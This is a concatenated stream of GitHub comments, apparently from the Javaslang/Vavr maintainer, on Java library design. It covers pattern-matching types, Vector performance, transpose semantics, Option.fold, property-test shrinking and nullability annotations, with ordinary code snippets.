However, the pattern matching will not work if we do not return a Pattern type, so we need to adjust that.\nUpdate:\nI investigate an alternative to change the return types of aliases and factory methods (see above). We may use emulated union types:\n``` java\n// before\nstatic  Option some(T value) {\n    return new Some<>(value);\n}\n// after\nstatic  & Option> R some(T value) {\n    return new Some<>(value);\n}\n```\nNote: This works in the following cases:\njava\nR extends CLASS_OR_INTERFACE & INTERFACE_1 & ... & INTERFACE_N\nHowever, it seems better to me to return the right type instead of dealing with wildcard bounds (as above):\njava\n// after (preferred solution)\nstatic <T, T1> Some<T> some(T value) {\n    return new Some<>(value);\n}\nIn each case Some needs to extends Pattern1.\n. Obsolete. We can't make Vavr Values implement Pattern*. Ok, let\u2019s revert it!\n\nOn Oct 30, 2016, at 11:57 PM, Pap L\u0151rinc notifications@github.com wrote:\n@paplorinc commented on this pull request.\nIn javaslang/src/main/java/javaslang/collection/Arrays.java https://github.com/javaslang/javaslang/pull/1650:\n\n@@ -35,6 +39,19 @@\n         return array;\n     }\n-    @SuppressWarnings(\"unchecked\")\n-    static  Object[] asArray(Iterable<? extends T> iterable) {\n-        if (iterable instanceof Collection<?>) {\n-            final Collection<? extends T> collection = (Collection<? extends T>) iterable;\n-            return collection.toArray();\n-        } else if (iterable instanceof Traversable) {\n-            final Traversable traversable = asTraversableAgain(iterable);\n  The iterable that's returned by the test is not an instance of Iterator, it's some anonymous lambda.\n  I don't think we can consume it twice, I recommend reverting it to\n\nif (iterable instanceof Collection<?>) {\n    final Collection<? extends T> collection = (Collection<? extends T>) iterable;\n    return collection.toArray();\n} else {\n    final Traversable traversable = asTraversableAgain(iterable);\n    return asArray(traversable.iterator(), traversable.size());\n}\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub https://github.com/javaslang/javaslang/pull/1650, or mute the thread https://github.com/notifications/unsubscribe-auth/AAtZmaSNcuf5OhID5NtwRW8o4_Xle2mIks5q5SDFgaJpZM4KkZll.\n. Right decision - use List then!\nOn Oct 31, 2016, at 12:01 AM, Pap L\u0151rinc notifications@github.com wrote:\n@paplorinc commented on this pull request.\nIn javaslang/src/test/java/javaslang/collection/euler/Euler67Test.java https://github.com/javaslang/javaslang/pull/1650:\n\n@@ -58,7 +59,7 @@ private static int solve(String fileName) {\n         return Vector.ofAll(\n                 Utils.readLines(Utils.file(fileName)).map(line ->\n                         Arrays.stream(line.split(\"\\s\")).map(Integer::parseInt)\n-                ).map(s -> Vector.ofAll(s::iterator))\n-                ).map(s -> List.ofAll(s::iterator).toVector())\n  I have reverted the test, but I needed to wrap the general Iterable to a List, otherwise I might not be able to go over it multiple times (e.g. it might be a Stream, that won't return the same iterator multiple times)\n\n\u2014\nYou are receiving this because you were mentioned.\nReply to this email directly, view it on GitHub https://github.com/javaslang/javaslang/pull/1650, or mute the thread https://github.com/notifications/unsubscribe-auth/AAtZmchFq9oiixf16K_oxfRmi7ezsAwFks5q5SHjgaJpZM4KkZll.\n. Thank you! Need some sleep - will come back to this issue tomorrow!\n. We should not modify the existing prepend() and append() both in Vector and BitMappedTrie. Especially a single prepend() or append() should not create an additional Iterator on their way.\n\nIt is good that you made appendAll() and prependAll() faster but I think that append() for example is a much more commonly used operation. We should not make it that much slower!\nI'm not sure if the ClassCastException related change is the right way to go. There are other options than running into an exception, for example adding some kind of introspection to the ArrayType, e.g. ArrayType.isPrimitive(Object) that checks sth. like ((Object[]) obj).getComponentType().isPrimitive().\nHowever, I'm not sure about this extra layer of automatic boxing and unboxing of underlying arrays. It adds additional magic that is not transparent to a user. The Vector currently has several orthogonal layers of this quality. For changes to Vector the developer needs to know all the internals of these additional magic layers in order to keep the Vector stable. That is really evil. As I mentioned in the recent change to CONTRIBUTION.md:\n\nRule 3. Fancy algorithms are slow when n is small, and n is usually small.\nRule 4. Fancy algorithms are buggier than simple ones, and they're much harder to implement.\n\nWhat we do here is way too fancy. Do we know if users really use prependAll() and appendAll() frequently? And even if so - are these methods really bottlenecks in their specific applications? I think we add way too much fancy optimizations. Also the other stuff recently added to Vector. I love implementations that are dead-simple and where the performance directly comes from the most basic data structures, like Tries. I do not care so much about being m times faster for a specific method than other implementations.\nThere are days where I'm tempted to revert the whole Vector implementation to its most basic form of BitMappedTrie without all the fancy stuff. Yes, it will be slower, but also it will be just beautiful in its natural form and so much more easy to maintain and -most important- less error prone.\n/cc @ruslansennov \n. @paplorinc, @zsolt-donca thank you for your constructive feedback, I really appreciate it. For now you convinced me to give it a try. The code lives, we can adjust it later if necessary. However, Vector turned to the most complex collection of Javaslang.\nNevertheless, many thanks for the ongoing efforts!\n. Done for unit tests. The mvn -T Cx option seems to make no difference.. This is just a refactoring of class location.\n. Note to myself: Test both widened and non-widened type T\n1) Widened\n``` java\npublic interface Option extends Value {\nfinal class Some<T> extends Pattern1<Some<? extends T>, T>\n                    implements Option<T>, Serializable {\n    @Override\n    public Option<T> unapply(Some<? extends T> t) {\n        return ...;\n    }\n}\n\nfinal class None<T> extends Pattern0<None<? extends T>>\n                    implements Option<T>, Serializable {\n    @Override\n    public Option<None<? extends T>> unapply(None<? extends T> ts) {\n        return ...;\n    }\n}\n\n}\n```\n2) Non-Widened\n``` java\npublic interface Option extends Value {\nfinal class Some<T> extends Pattern1<Some<T>, T>\n                    implements Option<T>, Serializable {\n    @Override\n    public Option<T> unapply(Some<T> t) {\n        return ...;\n    }\n}\n\nfinal class None<T> extends Pattern0<None<T>>\n                    implements Option<T>, Serializable {\n    @Override\n    public Option<None<T>> unapply(None<T> ts) {\n        return ...;\n    }\n}\n\n}\n```\nNote: It seems odd to me that Pattern0 'extracts itself' - it should unapply zero parts instead, i.e. unapply() should return Option<Void>. Added it to the list of breaking changes in 3.0.0.\nNote 2: As far as I know are Scala's case classes flat, i.e. they cannot extend another class (but implementing traits works). We experience the same with Javaslang's pattern matching because Pattern0..8 have to be abstract classes.\nIn Javaslang interfaces like Option are like sealed traits. The implementing final classes are like case classes. Because they extends Pattern they technically cannot extend another class.\n\nIf the above works in they way I expect it then we will have a huge fusion of Value and Pattern. For example the following will be possible:\n``` java\nTuple2, Option> obj = ...;\nMatch(obj).of(\n    Case(Tuple(Some(\"Java\"), None()), (some, none) -> ...),\n    Case(Tuple(None(), Some(8)), (none, some) -> ...),\n    Case(Tuple($(), $()), (o1, o2) -> ...)\n);\n```\nWith other words when using our new API aliases, we need $ only as wildcard and for predicates but not for values any more. But without having tested it this cannot be confirmed.\n(Side note: I know that some might have questioned my use of interfaces throughout Javaslang. Now it seems to pay off.)\n. While playing around with the code and the API I got a feeling for the domain. This change will not be backward-compatible - it has too much impact on the existing API.\nThe main idea will be to make Value impls directly pattern matchable. This can be achieved by extending Pattern0, which is a class. That is a problem, because each class can inherit from exactly one super class. Pattern0 has to be a class because an interface will introduce ambiguous APIs. The whole solution I currently have in mind looks fragile and not well thought through.\nToday I realized that the simplest solution would be to leave things as they are and move the generated Patterns from javaslang.Patterns to javaslang.API. Done.\nTherefore I will close this PR and move this the issue #1649 to 3.0.0 (for further investigation).. Thank you! The test is ok as-is.\n. Thank you Lorinc, interesting benchmarks! I hope we also can use the insights of the Scala language architects for the design of Javaslang.\n. Maybe we should be more specific regarding the component type of the argument in order to make use of the random-access property of IndexedSeq's when transposing.\nAlso we could make use of <T> instead of <? extends T> because we only change the structure, not the type, i.e.\n``` java\n    // transforms the given rows to columns, truncating the columns to the minimum length\n    static  Array> transpose(Iterable> rows) { ... }\n// transforms the given rows to columns, filling the columns with the defaultValue to the maximum length\nstatic <T> Array<Seq<T>> transpose(Iterable<Array<T>> rows, T defaultValue) { ... }\n\n```\n. See also Transposing arbitrary collection-of-collections in Scala\n. We should define static methods in these (and only these) types:\n```java\ninterface Array {\n    static  Array> transpose(Iterable<? extends Iterable<? extends T>> rows);\n    static  Array> transpose(Iterable<? extends Iterable<? extends T>> rows, T defaultValue);\n}\ninterface CharSeq {\n    static CharSeq transpose(Iterable<? extends Iterable> rows);\n    static CharSeq transpose(Iterable<? extends Iterable> rows, char defaultValue);\n}\n```\nand so on. We do this for all Seq implies, i.e. all types that have indexed elements:\n\nArray\nCharSeq\nVector\nList\nStream\nQueue\n\nIt is a good idea to implements Collections.transpose(...). However, I think we can make it more type-safe than your suggested solution. Also we need to distinguish between different row types when calculating the size... (checked via instanceof Seq and instanceof java.util.Collection, ...). sorry wrong button on my mobile device :-). @paplorinc yes (AT)T should be A, i.e.\njava\n// equals list\nList.transpose(List.transpose(list))\nIn general we have rows of different length, e.g.\njava\nList(\n  List(1, 2)\n  List(3, 4, 5)\n  List(6)\n)\nThe transposed result will be\njava\nList(\n  List(1, 3, 6)\n  List(2, 4, ?)\n  List(?, 5, ?)\n)\nAnd this one transposed again will be...\njava\nList(\n  List(1, 2, ?)\n  List(3, 4, 5)\n  List(6, ?, ?)\n)\nThe ? is either null or a default value. I don't know what ? may be in the case of CharSeq. 0x0?\nNote: We could narrow the parameter type, like\njava\ninterface List<T> {\n    static <T> List<List<T>> transpose(List<List<T>> rows);\n}\nBut I see no reason for that.\n\nYour second question: I don't think it makes sense to add transpose to collections that aren't indexed. E.g. insertion order or comparator will not be sufficient or produce 'funny'. results.... 'Special' case (not really special, it is straight forward but good to know):\njava\nList(\n  List(1, 2)\n  List(3)\n  List()\n)\nTransposed:\njava\nList(\n  List(1, 3, ?)\n  List(2, ?, ?)\n)\nTransposed:\njava\nList(\n  List(1, 2)\n  List(3, ?)\n  List(?, ?)\n)\n. @paplorinc\n\nOnly Array, Vector and CharSeq are indexed\n\nnope, all Seq's are indexed, the above are random access, i.e. get(index) is O(1). IndexedSeq does say us only s.th. about performance \n\nCharSeq cannot hold matrices\n\nright. however, it is indexed. A transpose makes sense. We should implement it, e.g. one or more of the following:\n```java\nfinal class CharSeq implements IndexedSeq, CharSequence {\nSeq<CharSeq> transpose(Iterable<? extends Iterable<Character>> rows) { ... }\n\nSeq transpose(String... rows) { ... }\nSeq transpose(CharSequence... rows) { ... }\n}\n```\n(plus the variants with second argument defaultValue)\n\nso only the first two qualify\n\nAll Seq's should have transpose. We can't predict all use cases of our users. We do it consistent.. Types?\n\nor return IndexedSeq<CharSeq>\nmaybe also return Seq<List> instead of List<List> when taking Iterables\nor maybe return  and take List<List>\n\nCriteria?\n\nwhat is best for our users?\nor should mathematical correctness be the main criteria? however, in mathematics we have not container types, only cross-products/relations.\nor do we have other criteria?\n. @paplorinc is right, without having a default value this might be the better choice:\n\njava\nList(\n  List(1, 2)\n  List(3)\n  List()\n)\nTransposed:\njava\nList(\n  List(1, 3)\n  List(2)\n)\nTransposed:\njava\nList(\n  List(1, 2)\n  List(3)\n)\n. Yes, we need them in API, additionally we may add Function*.unchecked(CheckedFunction*).\n. Yes, also just found it o_O - forgot about it.\n\nI will close this issue.\n. @mfejzer that sounds great! Looking forward to it :). @mfejzer Functions are\n\nContravariant in their arguments, i.e. ? super T*\nCovariant in the result type, i.e. ? extends R\n\nGiven a Function<? super T, ? extends R> f we say:\n\nT is a lower bound - in other words, f is a function that operates on super types of T\nR is a upper bound - in other words, f returns an R or sub-types of R\n\nThe narrowed form erases all bounds. Given the above rules, we can say, f is also of type\njava\nFunction<T, R>\nThat means\n\nif a Function processes a Lifeform, it is also able to process an Animal or a Human.\nif a Function returns a Human, we can also say that it returns a Lifeform\n\nDoes this make sense to you?\n. Fixed. @ruslansennov many thanks, this is huge!\n. Thank you for your suggestion.\nThe length/size of a collection is generally stored (for non-lazy collections that are traversable again). A size() call is considerably O(1).\nThe javadoc already contains an overview of general performance characteristics (see bottom of this page: http://static.javadoc.io/io.javaslang/javaslang/2.0.4/javaslang/collection/package-summary.html).\nAdding the performance characteristics to each method's javadoc is fragile because it cannot be checked formally for validity. I like the overview, maybe we can add more information there and additionally add a javadoc section to each class/interface about general performance characteristics?\n. Yes, maybe it is 'too hidden'. We may provide links at the collection javadoc and also add a section to the online documentation.\n. Added performance characteristics section to online documentation: http://www.javaslang.io/javaslang-docs/#_performance_characteristics. Awesome, thank you :-)\n. Hi @mfejzer, this is great, many thanks! Could you please the following lines to EitherTest.java (after the -- flatMap block)?\n``` java\n// -- peekLeft\n@Test\npublic void shouldPeekLeftNil() {\n    assertThat(empty().peekLeft(t -> {})).isEqualTo(empty());\n}\n@Test\npublic void shouldPeekLeftNonNil() {\n    final int[] effect = { 0 };\n    final Either actual = Either.left(1).peekLeft(i -> effect[0] = i);\n    assertThat(actual).isEqualTo(Either.left(1));\n    assertThat(effect[0]).isEqualTo(1);\n}\n```\nThank you!\n. @mfejzer thank you very much, nice first contribution!\n. Thank you. You are right, it is unclear. It is correct that the Either is right-biased, regardless if its left value or its right value is mapped. I will change the docs like this:\n\"Maps the left value of this Either, if present.\"\n. Yes, the javadoc could be more mature throughout the project. We currently focus on the work of the other issues towards the bugfix release 2.0.5 and the next minor release 2.1.0.\nContributions, especially to javadoc, are welcome!\n. Of course not.\n. Hi @mduesterhoeft, thank you for the fast impl! If you have room (and appetite) for more, than you could take a look at #1600.\nHi @ruslansennov, that's right, List has a smaller mem footprint. In the end it is the decision what should be the default Seq impl for Javaslang - a LinearSeq or an IndexedSeq. Alvin Alexander, the author of Scala Cookbook suggests to use Vector as default Seq (in Scala). We should apply that suggestion to Javaslang. Vector is general purpose. As this 'bug' shows, the time complexity highly depends on the type of the collection. We reduced the complexity from n^2 to n by just switching to Vector. Having a reliable time complexity is more important that saving bytes.\nI will pull this one now, many thanks!\n. @ruslansennov yes, that's right. For the user it is better if the returned Seq is eff. O(1) for operations like append. Therefor we should choose Vector as default general purpose impl for Seq return types. (Nevertheless this is no dogma, we have to decide it from case to case.)\n. Great, thank you!\n. I would love to see it as conversion method in Value:\n``` java\ninterface Value {\n<L> Either<L, T> toEither(L left) {\n    if (this instanceof Either)\u00a0{\n        return ((Either<?, T>) this).mapLeft(ignored -> left);\n    } else {\n        return isEmpty() ? Left(left) : Right(get());\n    }\n}\n\n<L> Either<L, T> toEither(Supplier<? extends L> leftSupplier) {\n    Objects.requireNonNull(leftSupplier, \"leftSupplier is null\");\n    if (this instanceof Either)\u00a0{\n        return ((Either<?, T>) this).mapLeft(ignored -> left);\n    } else {\n        return isEmpty() ? Left(leftSupplier.get()) : Right(get());\n    }\n }\n\n}\n```\nWe could do the same for Validation!\nUpdate: Please also add the conversion method to the Javadoc of the Value interface (at the top).\n. Thank you!\n. Good point. I think we should name it mapError because of getError (and deprecate leftMap).\n| Validation | Either |\n| --- | --- |\n| isValid | isRight |\n| isInvalid | isLeft |\n| get | get |\n| getError | getLeft |\n| map | map |\n| mapError~~leftMap~~ | mapLeft |\n. One more thing: the tests look great\n. great :)\n. Looks great, I think it can be merged now, right?\n. It is the first time sputnik checked this class. Could you please move the inner SerializableSupplier interface below the methods of AbstractMultimap? Thx!\n. Well done, thanks!\n. @mduesterhoeft great to hear :) you could either grab an issue of your choice (targeted for 2.1.0) or take a look at \"Add removeAll to Traversable\" #1305, which is similar to what you did so far.\n. Thank you Mathieu, well done (one feedback: we omit this.).\nThis is a tough decision. When I saw the email notification about this PR my first thoughts were:\n- \"Hell, why not\"\n- \"Having just Option.fold does not scale very well\"\n- \"Ok, I think the Foldable interface was once part of Value, our mother of of monadic types. Maybe we can move it back from Traversable to Value. But wait - aren't there also foldLeft, foldRight, ... do these make sense for single-valued types?\"\nIn the end I thought we should just add the fold to Option (without moving the Foldable interface) because it is/might be well known from Scala (or Haskell).\nBut then I read the following article and I agree: Option.fold() considered unreadable\nI got feedback that there are already (too) many ways to achieve the same. We should take care keeping the API simple and comprehensible (but powerful). This is no dogma, there are examples where we added aliases to the existing API, e.g. Map.zip() as shortcut for Map.zip(e -> e). However, the user does not need to change his thinking, he wants a zip and he gets a zip.\nAdding a fold(sup, f) as shortcut for map(f).getOrElse(sup) is different compared to adding a zip alias. The consumer of the API has to think in different ways of solving the same problem.\nIn the article I linked above Martin Odersky is cited: \"I personally find methods (...) that take two closures as arguments are often overdoing it.\"\nI think the Option.fold method does not fit well, therefore we should close this PR, for the following reasons:\n- Traversable is Foldable, but Value is not. At a first glance it seems inconsistent that Values like Option (Try, Either, ...) have fold but do not implement Foldable. This confuses our users.\n- There are too many ways to achieve the same. Keeping things simple is important. We also target an audience that is not familiar with Haskell or Scala.\n- There are already several ways to express fold(function, function)\nThese are the same:\n``` java\noption.fold(sup, f);\noption.map(f).getOrElse(sup);\noption.isDefined() ? f.apply(option.get()) : sup.get();\nMatch(option).of(\n    Case(Some($()), f::apply),\n    Case(None(), sup::get)\n);\n```\nMy suggestions are:\n1. Use option.map(f).getOrElse(sup)\n2. If it is crucial not to create an intermediate object (like map does) then use option.isDefined() ? f.apply(option.get()) : sup.get()\nI hope you understand my decision to steer Javaslang in this particular direction. Looking at all your popular Github organizations I think you do.\nI also hope to see future PRs from you :)\nGreets\nDaniel\n. Closing it now. Don't hesitate to share your thoughts.\n. Hi Mathieu,\n\nIs there a place were I can discuss future pull requests with the team before writing them ?\n\nthe best way is to create an issue. First I will label it as question and we can brainstorm how it integrate into the existing design etc.\nGreets\n- Daniel\n. Hi Emmanuel,\nthank you for sharing your thoughts! In fact the javaslang-pure module is exactly the place where functionality like lifting functions to operate on an algebraic layer should be located.\nIt is meant to be a purely functional add-on to the javaslang-core.\nBut yes, it is unfinished. Towards Javaslang 2.0.0 I factored-out functionality from the core to the pure module but it is still in an experimental state.\nWe should take this opportunity and add the functionality you suggested. We did the lifting already for Monads. Applicative needs to be extended in a similar way.\nA first step would be to move Application into Generator.scala and add the lift functions. We should keep the operations minimal - Monad currently only has map and flatMap, Applicativ has map. Looking at Haskell is always a good source of useful information.\n. I will think also about it - today I'm offline for the rest of the day... will comment tomorrow.\n. @emmanueltouzery I've thought about it the last days and also think that we do not need the notion of Monad (as type). Maybe it can be removed in the next version.\nI'm still not sure where to place the lift methods. We could use Monad as a helper class:\n```java\nfinal class Monad {\nstatic <T1, T2, R> Function2<Option<T1>, Option<T2>, Option<R>> liftOption(BiFunction<? super T1, ? super T2, ? extends R> f) {\n    return (o1, o2) -> o1.flatMap(t1 -> o2.map(t2 -> f.apply(t1, t2)));\n}\n\n// ... liftTry, liftFuture, ...\n\n}\n```\nBut the lift methods would also fit very well directly in Option, Try, Future, etc. Maybe we should offer these methods for all single-valued types in the core module javaslang (and not in javaslang-pure).. I'm not sure if API (aka the '2.1 approach') is the right place, there are already efforts to remove some methods (#1662, #1651). But we will find an appropriate place - this goes in the right direction.. depends on #1716 . See also Groovy Monads (/Applicatives). Algebraic functionality \u00e0 la Scalaz is out of scope for Vavr 1.0. We tightly align to Scala.. @ashrko619 because of ongoing PRs the branch conflicts need to be resolved. With your fix of #1685 the Iterator.toCharSeq method should work now.\nAs soon as you merged your local branch I will pull this PR! Thank you :)\n. Well done @ashrko619, many thanks!. Good catch!\nPlease do it this way:\n``` java\ninterface Value {\ndefault CharSeq toCharSeq() {\n    if (this instanceof CharSeq) {\n        return (CharSeq) this;\n    } if (isEmpty()) {\n        return CharSeq.empty();\n    } else {\n        return CharSeq.of(iterator().mkString());\n    }\n}\n\n}\n```\nUpdate: @ashrko619 I realized that the if (this instanceof Traversable) branch does not help very much - the overall complexity remains O(n). Therefore I removed it in the code above. Please consider it in your PR.\n. @ashrko619 please do this in a separate PR - after it is fixed we can pull #1684 \n. Mmhh, this will definitely change the semantics (and therefore won't be behavioral backward compatible any more) - but it is worth it. The current behavior can be seen as a bug.\nLet's fix the tests in this issue. I think it should not be much work because several errors will depend on tests in an abstract test class. Fixing these tests will multiply regarding the specific collection tests.\nIf you think it is too much I'm able to do it this evening (approx. in 5 hours).\n. Hi Emmanuel,\nthank you - this looks great to me.\n\nlet me know if you'd like that\n\nlet's wait with that for now. If possible I want to avoid cherry-picking for the next release. There will be more than 200 PRs, each having multiple commit in general. That would be overkill. Instead I will analyze and drill down API changes and double-check (binary) compatibility.\nAfter 2.1.0 is released I want to start to work on 3.0.0. There will be (one?) commit then that removes all deprecated API.\nMany thanks!\n. Great, thx!\n. Cool, Emacs! Not heard that often, yet :)\n. Many thanks! I did not know that we can use\njava\n<pre>{@code\n   ...\n}</pre>\ninstead of\njava\n<pre><code>\n   ...\n</code></pre>\n. Thank you! I will pull it in despite of Sputnik remarks. We need to tweak the Sputnik config later...\n. Awesome, thank you for revealing this bug!!\n. @pivovarit is there a way to perform the Sputnik checks locally in order to get faster turn-around cycles?\n. The remaining Sputnik remarks are ok for now - need to tweak the rules a bit.\n. Thank you!\nI think there are still several formatting-inconsistencies throughout the codebase - but on the other hand we take care of formatting. The repo is in a relatively good shape.\nI plan to re-format the whole repo (*.java) soon. The Checkstyle configuration needs to be accordingly adjusted to be consistent with our IntelliJ formatter. For now we will use Sputnik review comments as hints if there is s.th. wrong beyond formatting. /cc @paplorinc \n. Thank you Ruslan, that makes sense! I will close the issue.. This was the last fix for 2.0.5 - now starting to cherry-pick.\n. Will merge it in preparation of the upcoming bugfix release 2.0.5 (which will appear soon). Hi @nbardiuk, this looks great (at the very first sight). Give me some time to read through the code :)\nDon't be scared of all the Sputnik review comments. We haven't tweaked all rules, yet. Many Sputnik comments are no real issues (like the generic names etc.).. Is shrinking used to find a minimal sample that falsifies the property? I.e. is this change related to #551?\nUpdate:\nFixes #551 . Did you have seen this solution for the ScalaCheck shrinking problem that Generator constraints may not be respected? https://gist.github.com/davidallsopp/f65d73fea8b5e5165fc3\nDon't know if it matters.... I see a 'proper solution' outside of this PR. The API isn't shipped yet, we may change it afterwards.\nWithout having looked too deep into it: What if an Arbitrary would have an additional method\n```java\ninterface Arbitrary {\n// ...\n\n// or maybe: Shrink<T> shrink();\nOption<Shrink<T>> shrink();\n\n}\n```\nGiven that a 'default' Shrink could be used, unless the user specifies one.\nUpdate: Arbitrary is a FunctionalInterface. Adding such a method makes sense only as default method, returned a None by default.. Sounds great. I would suggest to prepare it in a second PR/branch if you don't mind.. My first, naive thought of solving #551 was to walk into a shrinking loop if the first run was a failure and reduce the size parameter of the underlying Arbitraries step-by-step, until no more failure could be found. That wouldn't require the notion of a 'Shrink'.\nWhich drawbacks does this solution have and what can be done with Shrink beyond it?. This PR has been parked for a long time.\nWe have to look at this topic again after Vavr 1.0.0 release (which will still take some time).. Hi @gtrefs,\nthank you for you detailed bug description - it helped me going straight to the cause of the problem.\nI think the following solution fits best because it is minimal invasive. It does work for your test above:\nBuggy version\njava\nstatic <T> Gen<T> choose(Iterable<T> values) {\n    Objects.requireNonNull(values, \"values is null\");\n    final Stream<T> stream = Stream.ofAll(values);\n    if (stream.isEmpty()) {\n        throw new IllegalArgumentException(\"Empty iterable\");\n    }\n    @SuppressWarnings(\"unchecked\")\n    final T[] array = stream.toJavaArray((Class<T>) stream.head().getClass());\n    return choose(array);\n}\nFixed version\njava\nstatic <T> Gen<T> choose(Iterable<T> values) {\n    Objects.requireNonNull(values, \"values is null\");\n    final Iterator<T> iterator = Iterator.ofAll(values);\n    if (!iterator.hasNext()) {\n        throw new IllegalArgumentException(\"Empty iterable\");\n    }\n    @SuppressWarnings(\"unchecked\")\n    final T[] array = (T[]) iterator.toJavaArray();\n    return choose(array);\n}\nAlso I realized that the javaslang-test package was written before we had javaslang.collection.Iterator. We can substitute (some) usages of Stream now with Iterator. I will create an issue to improve that.\nIf you do not find anything that is still in our way, could you please create a PR containing the fix sketched above?\nMany thanks!. (off-topic: I did the Iterator optimizations in #1700). Generally I agree that this might be useful but I'm afraid, Javaslang can't depend on any 3rd party library. That is one of the few constraints. Javaslang might only depend on JDK 8.. Thank you for your investigation. I also think that it is not priority one of Oracle to include these into JDK. There is an Oracle document \"Java 8's new Type Annotations\" but the link of the (default?) implementation \"Checker Framework\" does not exist any more.\nLet's keep this open for a while. I don't think it will make it into 2.1.0 but it is definitely worth to wait for JDK 9's take on it.\nBecause these annotations are so basic/essential, our goal should be to use the (yet non-existing) Java standard.\n--\nHowever, I think in most cases null is accepted in Javaslang.\nFor example\njava\nList<String> list = List(null); // is OK!\nbut\njava\nString min = list.min(); // throws NPE!\nAn additional check will help in cases we pass higher-order functions which of course may never be null.\nBtw - Javaslang offers the new TODO function, which helps the developer not to use null for rapid prototyping. Some examples:\n```java\nimport static javaslang.API.*;\nfinal String s = TODO(\"load user name from DB\");\nint calculateOverallAmount(int basketId) {\n    return TODO(\"sum overall amount of items in user basket\");\n}\n```\nThese will fail with a NotImplementedError containing a descriptive message instead of passing null around (which might be overseen and go to production o_O).. I also think that it is possible but I'm still thinking... My feeling about it is that it is an additional layer of information about the reality. This layer needs to be synchronized with the reality, so it most probably will eventually contain false or missing information.\nBecause null is almost nowhere used in Javaslang other than in container.getOrElse(defaultValue), container.forEach(maybeNull -> { ... }), container.peek(maybeNull -> { ... }) et.al. I don't know if it is really worth to add that complexity.. The nullability problem in Java is not solvable, even with an additional layer of annotations. Some people might use static checkers, others might not. The annotations do not save us from NullPointerExceptions at runtime.\nAs you mentioned, to date there are several competing implementations. Adding another one does feel a bit like:\n\nThis library is about object-functional programming with algebraic data types. There are other ways to make it explicit that there might occur null in the sense of 'not present', e.g. using the Option type.\nFrom the perspective of API maintenance it complicates things for us. All signs suggest not to introduce that additional layer above the existing API.\nEven Scala deprecated the @NotNull type for removal:\n\nFor now, we will not introduce it in Javaslang. It is the wrong way - to the dark side of the moon. We will stay on the light side.. Personally I will not dive deeper - the result stays the same, for now Javaslang will not include null-checks in form of annotations/as API addition.\nThis issue stays open for any community discussion. It is a hot topic. Many opinions exist. Please write yours - there is not the one and only truth. Be kind and respectful.\n- Daniel. @mp911de nice one :) will show that my 8 yo son - he is interested in space travel / planets & stars. @pgpx thx!\n\nat least at the method level, e.g. getOrElse does not explicitly state that other can be null\n\nThe 'semantics' of the Javaslang API spec is as follows (the same as I understand the JDK Java API docs):\n\nif nothing special is stated, method arguments of a specific type accept every possible value of that type (including null - the anti-value in Java that has no type)\nif a method is a partial function, i.e. the method range is defined for a subset of the domain, then the javadoc describes two things:\nwhich values of a specific parameter (type) are valid\nwhat happens if an invalid value is passed (for a specific parameter)\nthe output is specified\npossible side-effects are specified\n\nThe API describes much more than just non-nullability.. @mp911de \"The Dark Side of the Moon\" was an album by Pink Floyd that dealt with things that \"make people mad\". The title is \"an allusion to lunacy, rather than astronomy\". Source: Wikipedia\nlisten here\n. Fixed #1699 . Hi Jean-Baptiste,\nthank you for the PR! I'm afraid - one of the few constraints is that Javaslang cannot depend on any 3rd party libraries, no matter if it makes sense to include a feature or how many/few types are used.\nFrom CONTRIBUTION.md:\n\nBeside that the Javaslang core makes no use of Kind1/Kind2. Currently only the algebraic Monad.lift() and narrow() API makes use of Kind1. The Monad interface seems artificial. There is a discussion to remove the algebraic module and the Kind1/Kind2 types in the next major version in favor of adding the lift methods directly to the classes they belong to.\nTherefor I will close this PR. However, the bugs you found should be fixed.\n(Did you thought of bytecode enhancement? You could provide modules for libraries and manipulate the bytecode (at runtime) in order to add your interfaces.)\n--\nOne question beside that - you once asked for returning the interface instead of implementations when calling factory methods, e.g. Option.some() and Option.none() should return Option instead of Some and None. This was important for your code generation w.r.t. the visitor pattern, right?. @johnmcclean-aol Oh my god! ;-) Do you know anyone who uses these (in the way they are intended to be used)?\nUser: I need to encode a computation based on a List of elements.\nAnswer: Choose one...\n\nList\nListType\nListInstances\nApplicative\nFoldable\nHigher\nMonadPlus\nMonadZero\nTraverse\nUnit\n\nPlease watch this video. Erik Osheim talks about \"Principles for Modular, Functional, Approachable Libraries\" - somewhere within the first 15-20 minutes he mentions that users are scared by type-classes.. We experiment with pulling this abstraction into static lift methods that are directly located in the monadic types, e.g. Option.lift(f) -> liftedFunction\nNo need for hkt's and narrowing anymore.\nFor Monads this is simple. However, we need to figure out how this can be applied to Applicatives etc.. I think it will not be a mistake - it is just a matter of build infrastructure / build topology.\nWhen I try to understand dependencies I look at worst case szenarios. What if there are more frameworks than GWT that require Javaslang (source code) to behave in a specific way? Do they all need to be integrated into the javaslang module because we need fast build-feedback? I do not think so.\nWhat we really need is to trigger the javaslang-gwt build after the javaslang core build ran successful. That should be no problem. If javaslang-gwt moves to its own repo we need to activate an after-build step to our travis-ci config. If travis does not support cross-repository build triggers (like Jenkins) then we could call a trigger-script that commits (a timestamp for example) to the javaslang-gwt project. That will trigger a new ci build on that project.. I already have a trigger in mind using git by committing a timestamp. No problem!. @dharezlak Javaslang core is released manually. Currently all repositories (of the Javaslang organization) that depend on the core need to be released afterwards (manually). I don't know if it is possible to implement ~~continuous delivery~~ an automated release pipeline across all repositories \u2014 however, it would be cool!. Finished. See also javaslang/javaslang-gwt#1. The build runs fast(er) again :)\n\nThe result is ok for now, we have > 15000 unit tests(!).. Hi @iref,\nthank you for your suggestion! I prefer to do filtering is a behaviour that leads to a defined result. Throwing should be the least alternative, breaking the program at runtime is not a good idea.\nI'm looking forward to your contribution :-)\n- Daniel. We need a new repo javaslang-benchmark for that purpose. Then we are able to trigger it on every build of javaslang core.. Out of scope.\nBenchmarks should be frequently run instead before a minor or major release.. will take a look this evening!. Great, thank you!!. Thank you very much!!. Thank you, many (/most?) other static factory methods are also located in Tuple. I will take a look at the source later (I'm currently on a mobile device). Awesome, many thanks!. ok, let's pause until partial generation. This is dissatisfying. Anyway, thank you for all your effort! Your contributions are well thought-through and precisely implemented. I will spend some time soon on fixing the loose ends (also RedBlackTree in order to get the navigable Set additions).. Okay, I already thought about partial generation. I will create a ticket and write down my ideas...\n. @paplorinc Many thanks :) Now I have more time to code on Javaslang (beside taking care of my family) because I stay 1 month at home :)\nThe numbers speak for themselves. I will pull it in.. Wow, here is an actual research paper (2015): \"RRB vector: a practical general purpose immutable sequence\"\nWould love to see a very basic Java impl and a comparison to Vector! But I can't download it...\nIt is written by two researchers from EPFL/Switzerland (where Martin Odersky is located). So it is very likely to eventually appear in Scala!. I will also take a look - an interesting topic!. Yes, committing the generated code has benefits. 